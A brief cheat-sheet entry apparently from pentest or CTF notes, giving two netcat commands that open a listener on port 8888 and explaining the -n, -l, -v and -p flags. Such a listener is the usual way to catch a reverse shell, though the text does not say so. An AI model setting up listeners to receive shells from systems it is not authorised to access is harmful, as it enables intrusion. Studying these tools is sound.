nc -nlvp 8888
nc -vv -l -p 8888


-nlvp: These are command-line options specific to the netcat utility:

-n ensures that numeric addresses are not resolved to hostnames, making the output easier to read.
-l tells netcat to listen for incoming connections rather than initiating them.
-v enables verbose output, providing more detailed information during the connection.
-p 8888 specifies the port number on which netcat should listen. In this case, it is set to port 8888, but you can choose any available port number.
